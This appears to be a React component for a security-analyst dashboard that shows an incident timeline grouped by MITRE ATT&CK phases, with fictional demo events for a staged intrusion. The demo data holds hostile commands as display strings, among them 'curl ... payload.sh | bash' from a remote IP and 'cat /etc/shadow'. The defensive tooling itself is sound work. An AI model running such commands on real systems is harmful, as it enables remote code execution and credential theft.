"use client";

import { useState, type ReactNode } from "react";
import {
  AlertTriangle, Globe, Shield, Terminal, User,
  ChevronDown, ChevronRight, Clock, Filter,
} from "lucide-react";
import { cn } from "@/lib/utils";

// ── Types ─────────────────────────────────────────────────────────────────────

export type TimelineEventType =
  | "alert" | "network" | "auth" | "process" | "lateral" | "exfil" | "recon" | "privilege";

export type MitrePhase =
  | "Reconnaissance" | "Initial Access" | "Execution" | "Persistence"
  | "Privilege Escalation" | "Defense Evasion" | "Credential Access"
  | "Discovery" | "Lateral Movement" | "Collection" | "Exfiltration" | "Impact";

export interface TimelineEvent {
  id: string;
  type: TimelineEventType;
  title: string;
  summary: string;
  detail?: string;
  host?: string;
  user?: string;
  ip?: string;
  severity?: "critical" | "high" | "medium" | "low";
  mitreTactic?: MitrePhase;
  mitreTechnique?: string;
  timestamp: number;
}

// ── Metadata ──────────────────────────────────────────────────────────────────

const EVT_META: Record<TimelineEventType, { icon: ReactNode; color: string; label: string }> = {
  alert:     { icon: <AlertTriangle className="w-3.5 h-3.5" />, color: "text-critical",     label: "Alert" },
  network:   { icon: <Globe className="w-3.5 h-3.5" />,        color: "text-brand",         label: "Network" },
  auth:      { icon: <User className="w-3.5 h-3.5" />,         color: "text-warning",       label: "Auth" },
  process:   { icon: <Terminal className="w-3.5 h-3.5" />,     color: "text-brand-accent",  label: "Process" },
  lateral:   { icon: <Shield className="w-3.5 h-3.5" />,       color: "text-high",          label: "Lateral" },
  exfil:     { icon: <Globe className="w-3.5 h-3.5" />,        color: "text-critical",      label: "Exfil" },
  recon:     { icon: <Globe className="w-3.5 h-3.5" />,        color: "text-secondary",     label: "Recon" },
  privilege: { icon: <Shield className="w-3.5 h-3.5" />,       color: "text-high",          label: "Privilege" },
};

const SEV_DOT: Record<string, string> = {
  critical: "w-2.5 h-2.5 rounded-full bg-critical shadow-[0_0_6px_var(--color-critical)]",
  high:     "w-2.5 h-2.5 rounded-full bg-high shadow-[0_0_4px_var(--color-high)]",
  medium:   "w-2.5 h-2.5 rounded-full bg-medium",
  low:      "w-2.5 h-2.5 rounded-full bg-low",
};

const MITRE_PHASE_COLOR: Partial<Record<MitrePhase, string>> = {
  "Reconnaissance":       "bg-surface-tertiary text-muted",
  "Initial Access":       "bg-warning/15 text-warning",
  "Execution":            "bg-brand/15 text-brand",
  "Privilege Escalation": "bg-high/15 text-high",
  "Defense Evasion":      "bg-brand-accent/15 text-brand-accent",
  "Credential Access":    "bg-high/15 text-high",
  "Discovery":            "bg-surface-tertiary text-secondary",
  "Lateral Movement":     "bg-critical/10 text-critical",
  "Collection":           "bg-warning/15 text-warning",
  "Exfiltration":         "bg-critical/15 text-critical",
  "Impact":               "bg-critical/20 text-critical font-semibold",
};

// ── Demo data ─────────────────────────────────────────────────────────────────

export const DEMO_TIMELINE: TimelineEvent[] = [
  {
    id: "te1", type: "recon", title: "Port Scan Detected",
    summary: "Nmap-like TCP SYN scan from 192.168.4.21 against srv-db-01 (10.0.0.12)",
    detail: "Scanner hit 3412 ports in 8 seconds. Top open ports: 22, 3306, 5432, 8080.",
    ip: "192.168.4.21", host: "srv-db-01", severity: "medium",
    mitreTactic: "Reconnaissance", mitreTechnique: "T1595",
    timestamp: Date.now() - 7800000,
  },
  {
    id: "te2", type: "auth", title: "SSH Brute Force Started",
    summary: "141 failed SSH auth attempts in 2 minutes from 192.168.4.21",
    detail: "Usernames attempted: root, admin, ubuntu, backup, postgres, oracle\nAll failed until login at 02:14:33 UTC.",
    ip: "192.168.4.21", host: "srv-db-01", user: "root", severity: "critical",
    mitreTactic: "Initial Access", mitreTechnique: "T1110.001",
    timestamp: Date.now() - 7600000,
  },
  {
    id: "te3", type: "alert", title: "Successful SSH Login",
    summary: "User 'backup' logged in via SSH from 192.168.4.21 after brute force",
    ip: "192.168.4.21", host: "srv-db-01", user: "backup", severity: "critical",
    mitreTactic: "Initial Access", mitreTechnique: "T1078",
    timestamp: Date.now() - 7200000,
  },
  {
    id: "te4", type: "process", title: "Suspicious Process Execution",
    summary: "User 'backup' executed: curl http://185.220.101.45/payload.sh | bash",
    detail: "Process tree: sshd → bash → curl\nCommand retrieved and executed remote shell script.",
    host: "srv-db-01", user: "backup", ip: "185.220.101.45", severity: "critical",
    mitreTactic: "Execution", mitreTechnique: "T1059.004",
    timestamp: Date.now() - 7000000,
  },
  {
    id: "te5", type: "privilege", title: "Privilege Escalation via sudo",
    summary: "backup user executed 'sudo /bin/bash' — no prior sudo usage pattern",
    host: "srv-db-01", user: "backup", severity: "high",
    mitreTactic: "Privilege Escalation", mitreTechnique: "T1548.003",
    timestamp: Date.now() - 6800000,
  },
  {
    id: "te6", type: "process", title: "Credential Dumping Attempt",
    summary: "cat /etc/shadow executed by root — shadow file accessed",
    detail: "Full /etc/shadow read. File contents may have been exfiltrated.",
    host: "srv-db-01", user: "root", severity: "critical",
    mitreTactic: "Credential Access", mitreTechnique: "T1003.008",
    timestamp: Date.now() - 6500000,
  },
  {
    id: "te7", type: "lateral", title: "SMB Lateral Movement",
    summary: "Unusual SMB connection: srv-db-01 → srv-app-02 on port 445",
    ip: "10.0.0.14", host: "srv-db-01", severity: "high",
    mitreTactic: "Lateral Movement", mitreTechnique: "T1021.002",
    timestamp: Date.now() - 6200000,
  },
  {
    id: "te8", type: "auth", title: "New Admin Account Created on srv-app-02",
    summary: "Local admin 'svc_backup' created on srv-app-02 via net user command",
    host: "srv-app-02", user: "svc_backup", severity: "high",
    mitreTactic: "Persistence", mitreTechnique: "T1136.001",
    timestamp: Date.now() - 5900000,
  },
  {
    id: "te9", type: "exfil", title: "Large Data Transfer Outbound",
    summary: "4.2 GB HTTPS upload from srv-app-02 to 45.33.32.156 (Linode)",
    ip: "45.33.32.156", host: "srv-app-02", severity: "critical",
    mitreTactic: "Exfiltration", mitreTechnique: "T1048.002",
    timestamp: Date.now() - 5600000,
  },
];

// ── Utilities ─────────────────────────────────────────────────────────────────

function formatTs(ts: number): { date: string; time: string } {
  const d = new Date(ts);
  return {
    date: d.toLocaleDateString([], { month: "short", day: "numeric" }),
    time: d.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", second: "2-digit" }),
  };
}

function groupByPhase(events: TimelineEvent[]): Map<string, TimelineEvent[]> {
  const map = new Map<string, TimelineEvent[]>();
  for (const ev of events) {
    const key = ev.mitreTactic ?? "Unknown";
    if (!map.has(key)) map.set(key, []);
    map.get(key)!.push(ev);
  }
  return map;
}

// ── Event row ─────────────────────────────────────────────────────────────────

function EventRow({ event }: { event: TimelineEvent }) {
  const [expanded, setExpanded] = useState(false);
  const meta = EVT_META[event.type];
  const ts = formatTs(event.timestamp);

  return (
    <div className={cn("relative flex gap-0 group", event.severity === "critical" && "")}>
      {/* Timeline track */}
      <div className="relative flex flex-col items-center mr-3 shrink-0" style={{ width: 20 }}>
        <div className={cn("mt-2 shrink-0 z-10", event.severity ? SEV_DOT[event.severity] : "w-2 h-2 rounded-full bg-surface-border")} />
        <div className="flex-1 w-px bg-surface-border mt-1" />
      </div>

      {/* Content */}
      <div
        className={cn(
          "flex-1 mb-3 rounded-lg border transition-all",
          event.severity === "critical" ? "bg-critical/5 border-critical/20" :
          event.severity === "high"     ? "bg-high/5 border-high/20" :
                                          "bg-surface-secondary border-surface-border",
          expanded && "shadow-sm"
        )}
      >
        <button
          className="w-full flex items-start gap-3 px-3 py-2.5 text-left"
          onClick={() => setExpanded(!expanded)}
        >
          <span className={cn("shrink-0 mt-0.5", meta.color)}>{meta.icon}</span>
          <div className="flex-1 min-w-0">
            <div className="flex items-center gap-2 flex-wrap">
              <p className="text-small font-semibold text-primary leading-tight">{event.title}</p>
              {event.mitreTechnique && (
                <span className="text-tiny font-mono text-muted bg-surface-tertiary px-1.5 py-0.5 rounded">
                  {event.mitreTechnique}
                </span>
              )}
            </div>
            <p className="text-tiny text-secondary mt-0.5 leading-relaxed">{event.summary}</p>
            <div className="flex items-center flex-wrap gap-x-3 gap-y-0.5 mt-1.5">
              {event.host && <span className="text-tiny text-muted">host: <span className="text-secondary font-mono">{event.host}</span></span>}
              {event.user && <span className="text-tiny text-muted">user: <span className="text-secondary font-mono">{event.user}</span></span>}
              {event.ip && <span className="text-tiny text-muted">ip: <span className="text-secondary font-mono">{event.ip}</span></span>}
            </div>
          </div>
          <div className="text-right shrink-0">
            <p className="text-tiny text-primary font-mono">{ts.time}</p>
            <p className="text-tiny text-muted">{ts.date}</p>
          </div>
          {event.detail
            ? (expanded ? <ChevronDown className="w-3.5 h-3.5 text-muted shrink-0 mt-1" /> : <ChevronRight className="w-3.5 h-3.5 text-muted shrink-0 mt-1" />)
            : <div className="w-3.5" />
          }
        </button>

        {expanded && event.detail && (
          <div className="px-3 pb-3 border-t border-surface-border/50 pt-2">
            <pre className="text-tiny font-mono text-muted whitespace-pre-wrap leading-relaxed bg-surface-tertiary rounded px-2 py-1.5 overflow-x-auto">
              {event.detail}
            </pre>
          </div>
        )}
      </div>
    </div>
  );
}

// ── Phase divider ─────────────────────────────────────────────────────────────

function PhaseDivider({ phase }: { phase: string }) {
  const color = MITRE_PHASE_COLOR[phase as MitrePhase] ?? "bg-surface-tertiary text-secondary";
  return (
    <div className="flex items-center gap-2 my-2 pl-8">
      <span className={cn("px-2 py-0.5 rounded text-tiny font-medium", color)}>{phase}</span>
      <div className="flex-1 h-px bg-surface-border" />
    </div>
  );
}

// ── Main component ────────────────────────────────────────────────────────────

const ALL_TYPES = Object.keys(EVT_META) as TimelineEventType[];

interface InvestigationTimelineProps {
  events?: TimelineEvent[];
}

export function InvestigationTimeline({ events = DEMO_TIMELINE }: InvestigationTimelineProps) {
  const [typeFilters, setTypeFilters] = useState<Set<TimelineEventType>>(new Set());
  const [groupByMitre, setGroupByMitre] = useState(true);
  const [showFilter, setShowFilter] = useState(false);

  const toggleType = (t: TimelineEventType) => {
    setTypeFilters((prev) => {
      const next = new Set(prev);
      if (next.has(t)) next.delete(t); else next.add(t);
      return next;
    });
  };

  const filtered = typeFilters.size === 0
    ? events
    : events.filter((e) => typeFilters.has(e.type));

  const sorted = [...filtered].sort((a, b) => a.timestamp - b.timestamp);

  return (
    <div className="flex flex-col h-full overflow-hidden">
      {/* Toolbar */}
      <div className="flex items-center justify-between px-3 py-2 border-b border-surface-border shrink-0 bg-surface-primary">
        <div className="flex items-center gap-2">
          <Clock className="w-3.5 h-3.5 text-muted" />
          <span className="text-small font-medium text-secondary">{sorted.length} events</span>
        </div>
        <div className="flex items-center gap-2">
          <button
            onClick={() => setGroupByMitre(!groupByMitre)}
            className={cn(
              "text-tiny px-2.5 py-1 rounded transition-colors",
              groupByMitre ? "bg-brand-subtle text-brand" : "text-muted hover:text-secondary hover:bg-surface-tertiary"
            )}
          >
            MITRE phases
          </button>
          <div className="relative">
            <button
              onClick={() => setShowFilter(!showFilter)}
              className={cn(
                "flex items-center gap-1.5 text-tiny px-2.5 py-1 rounded transition-colors",
                typeFilters.size > 0 ? "bg-brand-subtle text-brand" : "text-muted hover:text-secondary hover:bg-surface-tertiary"
              )}
            >
              <Filter className="w-3 h-3" />
              Filter{typeFilters.size > 0 && ` (${typeFilters.size})`}
            </button>
            {showFilter && (
              <>
                <div className="fixed inset-0 z-40" onClick={() => setShowFilter(false)} />
                <div className="absolute right-0 top-full mt-1 z-50 card shadow-dropdown p-2 w-44 space-y-1 animate-scale-in">
                  {ALL_TYPES.map((t) => {
                    const m = EVT_META[t];
                    return (
                      <button
                        key={t}
                        onClick={() => toggleType(t)}
                        className={cn(
                          "w-full flex items-center gap-2 px-2 py-1.5 rounded text-small transition-colors",
                          typeFilters.has(t) ? "bg-brand-subtle text-brand" : "text-secondary hover:bg-surface-tertiary"
                        )}
                      >
                        <span className={m.color}>{m.icon}</span>
                        {m.label}
                      </button>
                    );
                  })}
                </div>
              </>
            )}
          </div>
        </div>
      </div>

      {/* Timeline */}
      <div className="flex-1 overflow-y-auto px-3 py-4">
        {sorted.length === 0 ? (
          <div className="flex flex-col items-center justify-center h-32 gap-2">
            <Clock className="w-8 h-8 text-muted" />
            <p className="text-small text-muted">No events match the current filter.</p>
          </div>
        ) : groupByMitre ? (
          (() => {
            const grouped = groupByPhase(sorted);
            return Array.from(grouped.entries()).map(([phase, evts]) => (
              <div key={phase}>
                <PhaseDivider phase={phase} />
                {evts.map((ev) => <EventRow key={ev.id} event={ev} />)}
              </div>
            ));
          })()
        ) : (
          sorted.map((ev) => <EventRow key={ev.id} event={ev} />)
        )}
      </div>
    </div>
  );
}
